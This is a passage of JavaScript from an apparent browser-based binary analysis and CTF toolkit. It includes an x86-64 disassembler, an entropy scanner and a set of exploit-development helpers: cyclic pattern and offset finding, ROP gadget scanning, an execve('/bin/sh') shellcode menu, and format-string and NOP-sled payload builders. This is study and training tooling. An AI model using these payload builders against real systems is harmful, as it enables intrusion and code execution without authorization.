      html += '<tr><td>' + (i / 2) + '</td><td>' + escapeHtml(sections[i]) + '</td><td>' + sections[i + 1] + ' bytes</td></tr>';
    }
    html += '</table>';
  } catch (e) { html += '<div class="hint warn">Section name table could not be parsed (unusual layout).</div>'; }
  } catch (e) { setOutText('elfOutput', 'Could not parse ELF header: ' + e.message + ' (file may be truncated or have an unusual layout).'); return; }
  setOut('elfOutput', html);
}

/* --- x86-64 disassembler: prefixes, REX, ModRM/SIB/disp, common 1- and 2-byte opcodes --- */
const X86 = (function () {
  const R64 = ['rax','rcx','rdx','rbx','rsp','rbp','rsi','rdi','r8','r9','r10','r11','r12','r13','r14','r15'];
  const R32 = ['eax','ecx','edx','ebx','esp','ebp','esi','edi','r8d','r9d','r10d','r11d','r12d','r13d','r14d','r15d'];
  const R16 = ['ax','cx','dx','bx','sp','bp','si','di','r8w','r9w','r10w','r11w','r12w','r13w','r14w','r15w'];
  const R8 = ['al','cl','dl','bl','spl','bpl','sil','dil','r8b','r9b','r10b','r11b','r12b','r13b','r14b','r15b'];
  const R8L = ['al','cl','dl','bl','ah','ch','dh','bh'];
  const ALU = ['add','or','adc','sbb','and','sub','xor','cmp'];
  const SHF = ['rol','ror','rcl','rcr','shl','shr','shl','sar'];
  const CC = ['o','no','b','ae','e','ne','be','a','s','ns','p','np','l','ge','le','g'];
  const hx = function (n) { return n < 0 ? '-0x' + (-n).toString(16) : '0x' + n.toString(16); };

  function decode(b, pos, addr) {
    const start = pos;
    let rex = 0, opsz = false, rep = 0, seg = '', adsz = false, lock = false;
    for (;;) {
      const p = b[pos];
      if (p === 0x66) opsz = true; else if (p === 0xf3 || p === 0xf2) rep = p; else if (p === 0x64) seg = 'fs:'; else if (p === 0x65) seg = 'gs:';
      else if (p === 0x67) adsz = true; else if (p === 0xf0) lock = true; else if (p === 0x2e || p === 0x3e || p === 0x26 || p === 0x36) { /* ignored segment overrides */ } else break;
      pos++;
      if (pos - start > 4) return null;
    }
    if (b[pos] >= 0x40 && b[pos] <= 0x4f) rex = b[pos++];
    const W = !!(rex & 8), R = (rex & 4) ? 8 : 0, X = (rex & 2) ? 8 : 0, B = (rex & 1) ? 8 : 0;
    const need = function (n) { return pos + n <= b.length; };
    const rd8 = function () { const v = b[pos]; pos++; return v << 24 >> 24; };
    const rd16 = function () { const v = b[pos] | b[pos + 1] << 8; pos += 2; return v; };
    const rd32 = function () { const v = (b[pos] | b[pos + 1] << 8 | b[pos + 2] << 16 | b[pos + 3] << 24) | 0; pos += 4; return v; };
    const rd64 = function () { let v = 0n; for (let i = 7; i >= 0; i--) v = (v << 8n) | BigInt(b[pos + i]); pos += 8; return v; };
    const regN = function (n, size) { return size === 64 ? R64[n] : size === 32 ? R32[n] : size === 16 ? R16[n] : (rex ? R8[n] : (n < 8 ? R8L[n] : R8[n])); };
    const osz = W ? 64 : (opsz ? 16 : 32);
    const ptr = { 8: 'byte', 16: 'word', 32: 'dword', 64: 'qword' };
    let modrm = null;
    function getModrm(size) { // returns {reg, rmStr, isReg, rmN}
      if (!need(1)) throw 0;
      const m = b[pos++], mod = m >> 6, reg = ((m >> 3) & 7) | R;
      let rm = m & 7;
      if (mod === 3) return { reg: reg, isReg: true, rmN: rm | B, str: regN(rm | B, size) };
      let base = null, index = null, scale = 1, disp = 0, rip = false;
      if (rm === 4) {
        if (!need(1)) throw 0;
        const sib = b[pos++]; scale = 1 << (sib >> 6);
        const idx = ((sib >> 3) & 7) | X; const bs = sib & 7;
        if (idx !== 4) index = idx;
        if (bs === 5 && mod === 0) { if (!need(4)) throw 0; disp = rd32(); } else base = bs | B;
      } else if (rm === 5 && mod === 0) { if (!need(4)) throw 0; disp = rd32(); rip = true; }
      else base = rm | B;
      if (mod === 1) { if (!need(1)) throw 0; disp = rd8(); } else if (mod === 2) { if (!need(4)) throw 0; disp = rd32(); }
      const ar = adsz ? R32 : R64;
      let s = '';
      if (rip) s = 'rip' + (disp < 0 ? '-' : '+') + hx(Math.abs(disp));
      else {
        const parts = [];
        if (base !== null) parts.push(ar[base]);
        if (index !== null) parts.push(ar[index] + (scale > 1 ? '*' + scale : ''));
        s = parts.join('+');
        if (disp || !parts.length) s += (parts.length ? (disp < 0 ? '-' : '+') + hx(Math.abs(disp)) : hx(disp));
      }
      return { reg: reg, isReg: false, rmN: 0, str: (size ? ptr[size] + ' ptr ' : '') + seg + '[' + s + ']', ripDisp: rip ? disp : null };
    }
    function imm(size) { // immediate for operand size (imm32 sign-extended for 64)
      if (size === 8) { if (!need(1)) throw 0; return rd8(); }
      if (size === 16) { if (!need(2)) throw 0; return rd16(); }
      if (!need(4)) throw 0; return rd32();
    }
    const immS = function (v, size) { return v < 0 ? hx(size === 64 ? v : (v >>> 0) - 0x100000000 * 0 ) : hx(v); };
    let out = null;
    try {
      if (!need(1)) return null;
      const op = b[pos++];
      const fin = function (m, o) { out = { m: m, o: o || '' }; };
      if (op < 0x40 && (op & 7) < 6 && op !== 0x0f) { // ALU block
        const name = ALU[op >> 3], k = op & 7;
        if (k < 4) {
          const sz = (k & 1) ? osz : 8; const m = getModrm(sz);
          const a = m.str, c = regN(m.reg, sz);
          fin(name, (k & 2) ? c + ', ' + a : a + ', ' + c);
        } else {
          const sz = (k === 4) ? 8 : osz; const v = imm(sz === 64 ? 32 : sz);
          fin(name, regN(0, sz) + ', ' + hx(v));
        }
      }
      else if (op >= 0x50 && op <= 0x57) fin('push', R64[(op - 0x50) | B]);
      else if (op >= 0x58 && op <= 0x5f) fin('pop', R64[(op - 0x58) | B]);
      else if (op === 0x63) { const m = getModrm(32); fin('movsxd', regN(m.reg, osz) + ', ' + m.str); }
      else if (op === 0x68) fin('push', hx(imm(32)));
      else if (op === 0x6a) fin('push', hx(imm(8)));
      else if (op === 0x69 || op === 0x6b) { const m = getModrm(osz); const v = imm(op === 0x6b ? 8 : (osz === 16 ? 16 : 32)); fin('imul', regN(m.reg, osz) + ', ' + m.str + ', ' + hx(v)); }
      else if (op >= 0x70 && op <= 0x7f) { const r = imm(8); fin('j' + CC[op & 15], hx(addr + (pos - start) + r)); }
      else if (op >= 0x80 && op <= 0x83) {
        const sz = op === 0x80 ? 8 : osz; const m = getModrm(sz); const v = imm(op === 0x81 ? (sz === 16 ? 16 : 32) : 8);
        fin(ALU[m.reg & 7], m.str + ', ' + hx(v));
      }
      else if (op === 0x84 || op === 0x85) { const sz = op === 0x84 ? 8 : osz; const m = getModrm(sz); fin('test', m.str + ', ' + regN(m.reg, sz)); }
      else if (op === 0x86 || op === 0x87) { const sz = op === 0x86 ? 8 : osz; const m = getModrm(sz); fin('xchg', m.str + ', ' + regN(m.reg, sz)); }
      else if (op >= 0x88 && op <= 0x8b) { const sz = (op & 1) ? osz : 8; const m = getModrm(sz); const c = regN(m.reg, sz); fin('mov', (op & 2) ? c + ', ' + m.str : m.str + ', ' + c); }
      else if (op === 0x8d) { const m = getModrm(0); fin('lea', regN(m.reg, osz) + ', ' + m.str); }
      else if (op === 0x8f) { const m = getModrm(64); fin('pop', m.str); }
      else if (op === 0x90) fin(rep === 0xf3 ? 'pause' : 'nop');
      else if (op > 0x90 && op <= 0x97) fin('xchg', regN((op - 0x90) | B, osz) + ', ' + regN(0, osz));
      else if (op === 0x98) fin(W ? 'cdqe' : opsz ? 'cbw' : 'cwde');
      else if (op === 0x99) fin(W ? 'cqo' : opsz ? 'cwd' : 'cdq');
      else if (op === 0xa4 || op === 0xa5) fin((rep ? 'rep ' : '') + 'movs' + (op === 0xa4 ? 'b' : (W ? 'q' : 'd')));
      else if (op === 0xaa || op === 0xab) fin((rep ? 'rep ' : '') + 'stos' + (op === 0xaa ? 'b' : (W ? 'q' : 'd')));
      else if (op === 0xa8) fin('test', 'al, ' + hx(imm(8)));
      else if (op === 0xa9) fin('test', regN(0, osz) + ', ' + hx(imm(osz === 16 ? 16 : 32)));
      else if (op >= 0xb0 && op <= 0xb7) fin('mov', regN((op - 0xb0) | B, 8) + ', ' + hx(imm(8) & 0xff));
      else if (op >= 0xb8 && op <= 0xbf) {
        if (W) { if (!need(8)) throw 0; fin('movabs', R64[(op - 0xb8) | B] + ', 0x' + rd64().toString(16)); }
        else { const v = imm(osz === 16 ? 16 : 32); fin('mov', regN((op - 0xb8) | B, osz) + ', 0x' + (osz === 16 ? v & 0xffff : v >>> 0).toString(16)); }
      }
      else if (op === 0xc0 || op === 0xc1 || (op >= 0xd0 && op <= 0xd3)) {
        const sz = (op & 1) ? osz : 8; const m = getModrm(sz);
        const cnt = op <= 0xc1 ? hx(imm(8) & 0xff) : (op <= 0xd1 ? '1' : 'cl');
        fin(SHF[m.reg & 7], m.str + ', ' + cnt);
      }
      else if (op === 0xc2) fin('ret', hx(imm(16)));
      else if (op === 0xc3) fin(rep === 0xf3 ? 'repz ret' : 'ret');
      else if (op === 0xc6 || op === 0xc7) { const sz = op === 0xc6 ? 8 : osz; const m = getModrm(sz); const v = imm(sz === 64 ? 32 : sz); fin('mov', m.str + ', ' + hx(v)); }
      else if (op === 0xc9) fin('leave');
      else if (op === 0xcc) fin('int3');
      else if (op === 0xcd) fin('int', hx(imm(8) & 0xff));
      else if (op === 0xe8) { const r = imm(32); fin('call', hx(addr + (pos - start) + r)); }
      else if (op === 0xe9) { const r = imm(32); fin('jmp', hx(addr + (pos - start) + r)); }
      else if (op === 0xeb) { const r = imm(8); fin('jmp', hx(addr + (pos - start) + r)); }
      else if (op === 0xf4) fin('hlt');
      else if (op === 0xf6 || op === 0xf7) {
        const sz = op === 0xf6 ? 8 : osz; const m = getModrm(sz); const f = m.reg & 7;
        if (f < 2) fin('test', m.str + ', ' + hx(imm(sz === 8 ? 8 : (sz === 16 ? 16 : 32))));
        else fin(['', '', 'not', 'neg', 'mul', 'imul', 'div', 'idiv'][f], m.str);
      }
      else if (op === 0xfe || op === 0xff) {
        const sz = op === 0xfe ? 8 : osz; const pk = b[pos]; const f = (pk >> 3) & 7;
        const m = getModrm((op === 0xff && (f === 2 || f === 4 || f === 6)) ? 64 : sz);
        if (f === 0) fin('inc', m.str); else if (f === 1) fin('dec', m.str);
        else if (op === 0xff && f === 2) fin('call', m.str); else if (op === 0xff && f === 4) fin('jmp', m.str);
        else if (op === 0xff && f === 6) fin('push', m.str); else out = null;
      }
      else if (op === 0x0f) {
        if (!need(1)) throw 0;
        const o2 = b[pos++];
        if (o2 === 0x05) fin('syscall');
        else if (o2 === 0x0b) fin('ud2');
        else if (o2 === 0xa2) fin('cpuid');
        else if (o2 === 0x1e && rep === 0xf3 && b[pos] === 0xfa) { pos++; fin('endbr64'); }
        else if (o2 === 0x1f) { const m = getModrm(osz); fin('nop', m.str); }
        else if (o2 >= 0x80 && o2 <= 0x8f) { const r = imm(32); fin('j' + CC[o2 & 15], hx(addr + (pos - start) + r)); }
        else if (o2 >= 0x90 && o2 <= 0x9f) { const m = getModrm(8); fin('set' + CC[o2 & 15], m.str); }
        else if (o2 >= 0x40 && o2 <= 0x4f) { const m = getModrm(osz); fin('cmov' + CC[o2 & 15], regN(m.reg, osz) + ', ' + m.str); }
        else if (o2 === 0xaf) { const m = getModrm(osz); fin('imul', regN(m.reg, osz) + ', ' + m.str); }
        else if (o2 === 0xb6 || o2 === 0xb7 || o2 === 0xbe || o2 === 0xbf) { const ssz = (o2 & 1) ? 16 : 8; const m = getModrm(ssz); fin((o2 < 0xb8 ? 'movzx' : 'movsx'), regN(m.reg, osz) + ', ' + m.str); }
      }
      if (!out) return null;
      const len = pos - start;
      return { len: len, text: (lock ? 'lock ' : '') + (out.o ? out.m + ' ' + out.o : out.m), m: out.m, bytes: b.slice(start, pos) };
    } catch (e) { return null; }
  }
  return { decode: decode };
})();

function disassembleTool() {
  const bytes = hexToBytesArr(document.getElementById('disasmInput').value);
  const base = parseInt(document.getElementById('disasmBase').value.replace(/^0x/i, '') || '0', 16) || 0;
  const lines = [];
  let i = 0;
  const hex = function (a) { return Array.from(a).map(function (x) { return x.toString(16).padStart(2, '0'); }).join(' '); };
  while (i < bytes.length) {
    const d = X86.decode(bytes, i, base + i);
    const addr = (base + i).toString(16).padStart(8, '0');
    if (d) { lines.push(addr + ':  ' + hex(d.bytes).padEnd(30) + d.text); i += d.len; }
    else { lines.push(addr + ':  ' + hex([bytes[i]]).padEnd(30) + '(bad)  ; not in this decoder\'s opcode set (SSE/AVX/x87/system)'); i++; }
  }
  setOutText('disasmOutput', lines.length ? lines.join('\n') : 'Enter hex bytes to disassemble.');
}

async function binaryDiffTool() {
  const fa = document.getElementById('diffA').files[0], fb = document.getElementById('diffB').files[0];
  if (!fa || !fb) { toast('Choose both files', 'err'); return; }
  const [ba, bb] = await Promise.all([readFileAsArrayBuffer(fa), readFileAsArrayBuffer(fb)]);
  const a = new Uint8Array(ba), b = new Uint8Array(bb);
  const maxLen = Math.max(a.length, b.length);
  const diffs = [];
  for (let i = 0; i < maxLen; i++) {
    const av = i < a.length ? a[i] : null, bv = i < b.length ? b[i] : null;
    if (av !== bv) diffs.push({ off: i, a: av, b: bv });
    if (diffs.length > 500) break;
  }
  if (!diffs.length && a.length === b.length) { setOutText('diffOutput', 'Identical — both files are ' + a.length + ' bytes with no differences.'); return; }
  let html = '<div class="hint">A: ' + a.length + ' bytes, B: ' + b.length + ' bytes, ' + diffs.length + ' differing offset(s)' + (diffs.length === 500 ? ' (showing first 500)' : '') + '</div>';
  html += '<table class="data-tbl"><tr><th>offset</th><th>A</th><th>B</th></tr>';
  diffs.forEach(function (d) {
    html += '<tr><td>0x' + d.off.toString(16) + '</td><td>' + (d.a === null ? '—' : '0x' + d.a.toString(16).padStart(2, '0')) + '</td><td>' + (d.b === null ? '—' : '0x' + d.b.toString(16).padStart(2, '0')) + '</td></tr>';
  });
  html += '</table>';
  setOut('diffOutput', html);
}

function endianSwapTool() {
  const raw = document.getElementById('endianInput').value.trim();
  const width = Number(document.getElementById('endianWidth').value);
  let n;
  try { n = raw.toLowerCase().startsWith('0x') ? BigInt(raw) : BigInt(raw); } catch (e) { setOutText('endianOutput', 'Enter a valid hex (0x...) or decimal number.'); return; }
  const bytes = [];
  for (let i = 0; i < width; i++) { bytes.push(Number((n >> BigInt(i * 8)) & 0xffn)); }
  const be = bytes.slice().reverse();
  setOutText('endianOutput',
    'Little-endian bytes: ' + bytes.map(function (b) { return b.toString(16).padStart(2, '0'); }).join(' ') +
    '\nBig-endian bytes:    ' + be.map(function (b) { return b.toString(16).padStart(2, '0'); }).join(' ') +
    '\nSwapped value: 0x' + be.map(function (b) { return b.toString(16).padStart(2, '0'); }).join(''));
}

const LINUX_X64_SYSCALLS = [
  [0, 'read', 'read(fd, buf, count)'], [1, 'write', 'write(fd, buf, count)'], [2, 'open', 'open(path, flags, mode)'],
  [3, 'close', 'close(fd)'], [4, 'stat', 'stat(path, buf)'], [9, 'mmap', 'mmap(addr, len, prot, flags, fd, off)'],
  [10, 'mprotect', 'mprotect(addr, len, prot)'], [11, 'munmap', 'munmap(addr, len)'], [12, 'brk', 'brk(addr)'],
  [21, 'access', 'access(path, mode)'], [22, 'pipe', 'pipe(fds)'], [32, 'dup', 'dup(fd)'], [33, 'dup2', 'dup2(old,new)'],
  [39, 'getpid', 'getpid()'], [41, 'socket', 'socket(domain, type, proto)'], [42, 'connect', 'connect(fd, addr, len)'],
  [49, 'bind', 'bind(fd, addr, len)'], [50, 'listen', 'listen(fd, backlog)'], [56, 'clone', 'clone(flags, stack, …)'],
  [57, 'fork', 'fork()'], [59, 'execve', 'execve(path, argv, envp)'], [60, 'exit', 'exit(status)'],
  [61, 'wait4', 'wait4(pid, status, opts, rusage)'], [62, 'kill', 'kill(pid, sig)'], [87, 'unlink', 'unlink(path)'],
  [101, 'ptrace', 'ptrace(request, pid, addr, data)'], [102, 'getuid', 'getuid()'], [105, 'setuid', 'setuid(uid)'],
  [160, 'setrlimit', 'setrlimit(resource, rlim)'], [231, 'exit_group', 'exit_group(status)'],
  [257, 'openat', 'openat(dirfd, path, flags, mode)'], [322, 'execveat', 'execveat(dirfd, path, argv, envp, flags)']
];
function renderSyscallTable() {
  const q = (document.getElementById('syscallSearch').value || '').toLowerCase();
  const rows = LINUX_X64_SYSCALLS.filter(function (r) { return !q || r[1].includes(q) || String(r[0]) === q; });
  let html = '<table class="data-tbl"><tr><th>rax</th><th>name</th><th>signature</th></tr>';
  rows.forEach(function (r) { html += '<tr><td>' + r[0] + '</td><td>' + r[1] + '</td><td>' + r[2] + '</td></tr>'; });
  html += '</table>';
  setOut('syscallOutput', html);
}
TOOL_INIT_HOOKS['syscall-reference'] = renderSyscallTable;

const X86_OPCODES = [
  ['50-57', 'push reg', 'push a 64-bit GP register'], ['58-5f', 'pop reg', 'pop into a 64-bit GP register'],
  ['c3', 'ret', 'near return'], ['c9', 'leave', 'mov rsp,rbp; pop rbp'], ['90', 'nop', 'no-op'],
  ['cc', 'int3', 'breakpoint trap (SIGTRAP)'], ['f4', 'hlt', 'halt (privileged)'],
  ['89', 'mov r/m,r', 'move register to register/memory'], ['8b', 'mov r,r/m', 'move register/memory to register'],
  ['b8-bf', 'mov reg,imm32', 'move immediate into register'], ['8d', 'lea', 'load effective address'],
  ['01', 'add', 'add'], ['29', 'sub', 'subtract'], ['31', 'xor', 'exclusive or'], ['83', 'add/sub/cmp r/m,imm8', 'ALU group with sign-extended imm8'],
  ['e8', 'call rel32', 'near call, relative'], ['e9', 'jmp rel32', 'near jump, relative'], ['eb', 'jmp rel8', 'short jump, relative'],
  ['74', 'je/jz rel8', 'jump if equal/zero'], ['75', 'jne/jnz rel8', 'jump if not equal'], ['0f 05', 'syscall', 'fast system call (x86-64)'],
  ['40-4f', 'REX prefix', '64-bit operand / extended register prefix'], ['cd', 'int imm8', 'software interrupt'],
];
// A search for a single hex byte ('55', '5d', 'ba'…) should hit a stored range like '50-57' when the
// byte falls inside it — plain substring matching against the range text never does that, since the
// typed byte usually isn't a substring of its own range's label at all.
function opcodeRowMatchesByte(range, queryByte) {
  const m = range.match(/^([0-9a-f]{2})-([0-9a-f]{2})$/i);
  if (!m) return false;
  const lo = parseInt(m[1], 16), hi = parseInt(m[2], 16);
  return queryByte >= lo && queryByte <= hi;
}
function renderOpcodeTable() {
  const qRaw = (document.getElementById('opcodeSearch').value || '').toLowerCase().trim();
  const qNoSpace = qRaw.replace(/\s+/g, '');
  const qByte = /^[0-9a-f]{2}$/.test(qNoSpace) ? parseInt(qNoSpace, 16) : null;
  const rows = X86_OPCODES.filter(function (r) {
    if (!qRaw) return true;
    if (r[0].toLowerCase().includes(qRaw) || r[1].toLowerCase().includes(qRaw)) return true;
    if (r[0].toLowerCase().replace(/\s+/g, '').includes(qNoSpace)) return true; // '0f 05' matches typed '0f05'
    if (qByte !== null && opcodeRowMatchesByte(r[0], qByte)) return true; // '55' matches stored range '50-57'
    return false;
  });
  let html = '<table class="data-tbl"><tr><th>byte(s)</th><th>mnemonic</th><th>meaning</th></tr>';
  rows.forEach(function (r) { html += '<tr><td>' + r[0] + '</td><td>' + r[1] + '</td><td>' + r[2] + '</td></tr>'; });
  html += '</table>';
  setOut('opcodeOutput', html);
}
TOOL_INIT_HOOKS['opcode-reference'] = renderOpcodeTable;

async function entropyScanTool() {
  const f = document.getElementById('entropyInput').files[0];
  if (!f) { toast('Choose a file first', 'err'); return; }
  const chunkSize = Math.max(32, Number(document.getElementById('entropyChunk').value) || 256);
  const buf = await readFileAsArrayBuffer(f);
  const bytes = new Uint8Array(buf);
  const rows = [];
  for (let off = 0; off < bytes.length; off += chunkSize) {
    const chunk = bytes.slice(off, off + chunkSize);
    rows.push({ off: off, entropy: calcShannonEntropy(chunk) });
  }
  const html = rows.map(function (r) {
    const bars = Math.round(r.entropy / 8 * 40);
    const cls = r.entropy > 7.2 ? 'bad' : r.entropy > 6 ? 'warn' : 'good';
    return '0x' + r.off.toString(16).padStart(6, '0') + '  ' + r.entropy.toFixed(2) + '  <span class="badge ' + cls + '">' + '█'.repeat(Math.max(1, bars)) + '</span>';
  }).join('\n');
  setOut('entropyOutput', html + '\n\nHigh entropy (>7.2 bits/byte, red) across most of the file usually means packed, compressed or encrypted content.');
}

/* ---------------------------------------------------------------------- */
/* BINARY PWN — catalog                                                   */
/* ---------------------------------------------------------------------- */
registerTool('pwn', 'PWN', 'PWN-01', 'pattern-generator', 'Pattern Generator', 'Real De Bruijn cyclic pattern (metasploit pattern_create-compatible) plus simple alphabetic/numeric patterns.');
registerTool('pwn', 'PWN', 'PWN-02', 'offset-finder', 'Offset Finder', 'Finds where a 4/8-byte crash value falls inside a generated cyclic pattern.');
registerTool('pwn', 'PWN', 'PWN-03', 'rop-scanner', 'ROP Gadget Scanner', 'Scans an uploaded binary for `ret` instructions and the bytes just before them — a real, basic gadget-hunting technique.');
registerTool('pwn', 'PWN', 'PWN-04', 'shellcode-reference', 'Shellcode Reference', 'Well-known minimal Linux x86/x86-64 shellcodes, with an XOR encoder/decoder.');
registerTool('pwn', 'PWN', 'PWN-05', 'format-string-helper', 'Format String Helper', 'Builds %x/%p/%n leak chains and computes stack-offset payloads.');
registerTool('pwn', 'PWN', 'PWN-06', 'nopsled-composer', 'NOP Sled Composer', 'Assembles NOP sled + shellcode + return address into one payload.');
registerTool('pwn', 'PWN', 'PWN-07', 'int-overflow', 'Integer Overflow Calculator', 'Shows real wraparound behaviour for signed/unsigned 8/16/32/64-bit integers.');

const PWN_INTERFACES = {
  'pattern-generator': function () {
    return ui_field('Length', '<input type="number" id="patLen" value="200" min="1" max="200000">') +
      '<div class="field"><label>Pattern type</label><select id="patType"><option value="debruijn">Cyclic (De Bruijn, metasploit-compatible)</option><option value="alpha">Alphabetic</option><option value="numeric">Numeric</option><option value="custom">Custom charset</option></select></div>' +
      ui_field('Custom charset (if selected)', '<input type="text" id="patCustom" placeholder="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789">') +
      ui_btns([{ label: 'Generate', onclick: 'generatePatternTool()', primary: true }]) +
      ui_field('Pattern', ui_out('patOutput')) + ui_copyBtn('patOutput');
  },
  'offset-finder': function () {
    return ui_field('The cyclic pattern you generated (paste the same one you sent to the target)', ui_textarea('offsetPattern', 3, '')) +
      ui_field('Crash value (from the crashed register/stack — hex or raw text, 4–8 chars)', '<input type="text" id="offsetCrash" placeholder="e.g. 6161616a or Aa0Aa1Aa2">') +
      ui_btns([{ label: 'Find offset', onclick: 'findOffsetTool()', primary: true }]) +
      ui_field('Result', ui_out('offsetOutput'));
  },
  'rop-scanner': function () {
    return ui_field('Binary', '<input type="file" id="ropInput">') +
      ui_field('Bytes of context before each ret', '<input type="number" id="ropContext" value="6" min="1" max="16">') +
      ui_btns([{ label: 'Scan for ret-ending gadgets', onclick: 'ropScanTool()', primary: true }]) +
      ui_field('Candidates', ui_out('ropOutput'));
  },
  'shellcode-reference': function () {
    return '<div class="field"><label>Shellcode</label><select id="scChoice" onchange="renderShellcodeChoice()">' +
      '<option value="execve64">Linux x86-64 — execve("/bin/sh")</option>' +
      '<option value="execve32">Linux x86 — execve("/bin/sh")</option>' +
      '<option value="exit64">Linux x86-64 — exit(0)</option>' +
      '</select></div>' +
      '<div id="scBytesOutput" class="out"></div>' +
      ui_field('XOR-encode with key (hex byte, e.g. AA)', '<input type="text" id="scXorKey" value="AA" maxlength="2">') +
      ui_btns([{ label: 'Encode', onclick: 'xorEncodeShellcode()' }]) +
      ui_field('Encoded', ui_out('scEncodedOutput')) +
      '<div class="hint warn">For authorized testing and learning only — against your own binaries or a sanctioned CTF target.</div>';
  },
  'format-string-helper': function () {
    return ui_field('Number of stack slots to probe', '<input type="number" id="fmtSlots" value="12" min="1" max="60">') +
      ui_btns([{ label: 'Build %p leak chain', onclick: 'buildFmtLeakChain()', primary: true }]) +
      ui_field('Leak payload', ui_out('fmtLeakOutput')) +
      '<div class="row2">' + ui_field('Target stack offset (which %n writes)', '<input type="number" id="fmtOffset" value="7" min="1" max="60">') +
      ui_field('Value to write (decimal)', '<input type="number" id="fmtValue" value="1337">') + '</div>' +
      ui_btns([{ label: 'Build %n write payload', onclick: 'buildFmtWritePayload()' }]) +
      ui_field('Write payload', ui_out('fmtWriteOutput'));
  },
  'nopsled-composer': function () {
    return '<div class="row2">' + ui_field('NOP sled length (bytes)', '<input type="number" id="nopLen" value="32" min="0" max="4096">') +
      ui_field('Return address (hex, e.g. bffff234)', '<input type="text" id="nopRet" placeholder="bffff234">') + '</div>' +
      ui_field('Shellcode (hex bytes)', ui_textarea('nopShellcode', 3, '31c050687361766e5f90…')) +
      ui_field('Total buffer size (0 = don\'t pad)', '<input type="number" id="nopTotal" value="0" min="0">') +
      ui_btns([{ label: 'Compose payload', onclick: 'composeNopsledTool()', primary: true }]) +
      ui_field('Payload (hex)', ui_out('nopOutput'));
  },
  'int-overflow': function () {
    return ui_field('Value (decimal or 0x hex)', '<input type="text" id="ovfValue" placeholder="e.g. 4294967295 or -1">') +
      '<div class="row2">' + ui_field('Width', '<select id="ovfWidth"><option value="8">8-bit</option><option value="16">16-bit</option><option value="32" selected>32-bit</option><option value="64">64-bit</option></select>') +
      ui_field('Signedness', '<select id="ovfSign"><option value="unsigned">unsigned</option><option value="signed">signed</option></select>') + '</div>' +
      ui_btns([{ label: 'Compute wraparound', onclick: 'intOverflowTool()', primary: true }]) +
      ui_field('Result', ui_out('ovfOutput'));
  }
};

/* --- De Bruijn cyclic pattern, real metasploit-style generator --- */
function deBruijn(alphabet, n) {
  const k = alphabet.length;
  const a = new Array(k * n).fill(0);
  const sequence = [];
  function db(t, p) {
    if (t > n) { if (n % p === 0) for (let i = 1; i <= p; i++) sequence.push(a[i]); return; }
    a[t] = a[t - p];
    db(t + 1, p);
    for (let j = a[t - p] + 1; j < k; j++) { a[t] = j; db(t + 1, t); }
  }
  db(1, 1);
  return sequence.map(function (i) { return alphabet[i]; });
}
function cyclicPattern(length) {
  const upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', lower = 'abcdefghijklmnopqrstuvwxyz', digits = '0123456789';
  let out = '';
  outer:
  for (const U of upper) for (const L of lower) for (const D of digits) {
    out += U + L + D;
    if (out.length >= length) break outer;
  }
  return out.slice(0, length);
}
const CYCLIC_PATTERN_MAX = 26 * 26 * 10; // 3-char (upper, lower, digit) alphabet exhausts its unique sequences at 20280 bytes
function generatePatternTool() {
  const len = Math.max(1, Math.min(200000, Number(document.getElementById('patLen').value) || 200));
  const type = document.getElementById('patType').value;
  let out;
  if (type === 'debruijn') {
    out = cyclicPattern(len);
    // real metasploit pattern_create errors past this cap rather than silently shortening the pattern —
    // warn via toast rather than appending text to patOutput, which stays copy-paste-safe as just the pattern
    if (len > CYCLIC_PATTERN_MAX) toast('Requested ' + len + ' bytes, but the 3-char cyclic alphabet only has ' + CYCLIC_PATTERN_MAX + ' unique bytes — pattern capped there. Use alphabetic/numeric/custom mode for a longer unique run.', 'err');
  }
  else if (type === 'alpha') { const a = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; out = ''; for (let i = 0; i < len; i++) out += a[i % a.length]; }
  else if (type === 'numeric') { out = ''; for (let i = 0; i < len; i++) out += String(i % 10); }
  else { const chars = document.getElementById('patCustom').value || 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; out = ''; for (let i = 0; i < len; i++) out += chars[i % chars.length]; }
  setOutText('patOutput', out);
}
function findOffsetTool() {
  const pattern = document.getElementById('offsetPattern').value.trim();
  let crash = document.getElementById('offsetCrash').value.trim();
  if (!pattern) { setOutText('offsetOutput', 'Paste the pattern you generated first.'); return; }
  // if hex and even length, try little-endian text interpretation (common with register dumps)
  let needle = crash;
  const crashNo0x = crash.replace(/^0x/i, '');
  if (/^[0-9a-fA-F]{8}$/.test(crashNo0x) || /^[0-9a-fA-F]{16}$/.test(crashNo0x)) {
    const bytes = hexToBytesArr(crashNo0x);
    needle = bytesToAsciiPreview(Array.from(bytes).reverse());
  }
  let idx = pattern.indexOf(needle);
  if (idx === -1 && needle !== crash) idx = pattern.indexOf(crash);
  if (idx === -1) { setOutText('offsetOutput', '"' + crash + '" (tried as "' + needle + '") was not found in the pattern — double-check you copied the exact crash value, and that it came from this exact pattern.'); return; }
  setOutText('offsetOutput', 'Offset = ' + idx + ' bytes into the pattern.\n(Interpreted crash value as "' + needle + '" within the buffer.)');
}

async function ropScanTool() {
  const f = document.getElementById('ropInput').files[0];
  if (!f) { toast('Choose a binary first', 'err'); return; }
  const context = Math.max(1, Math.min(16, Number(document.getElementById('ropContext').value) || 6));
  const buf = await readFileAsArrayBuffer(f);
  const bytes = new Uint8Array(buf);
  const hits = [];
  for (let i = 0; i < bytes.length; i++) {
    if (bytes[i] === 0xc3) { // ret
      const start = Math.max(0, i - context);
      hits.push({ off: i, bytes: bytes.slice(start, i + 1) });
      if (hits.length >= 300) break;
    }
  }
  if (!hits.length) { setOutText('ropOutput', 'No 0xc3 (ret) bytes found.'); return; }
  const html = hits.map(function (h) {
    return '0x' + h.off.toString(16).padStart(6, '0') + ':  ' + Array.from(h.bytes).map(function (b) { return b.toString(16).padStart(2, '0'); }).join(' ');
  }).join('\n');
  setOut('ropOutput', html + '\n\n' + hits.length + ' ret-ending byte windows found. This is raw byte scanning, not instruction-boundary-aware disassembly — cross-check promising offsets with the Mini Disassembler or a real tool (ropper/ROPgadget) before relying on one.');
}

const SHELLCODES = {
  // Both execve entries below were re-verified in this session with objdump (x86-64 / i386, Intel syntax)
  // against their exact listed hex — the previous bytes here didn't disassemble to a `syscall`/`int 0x80`
  // at all and never actually called execve. These do.
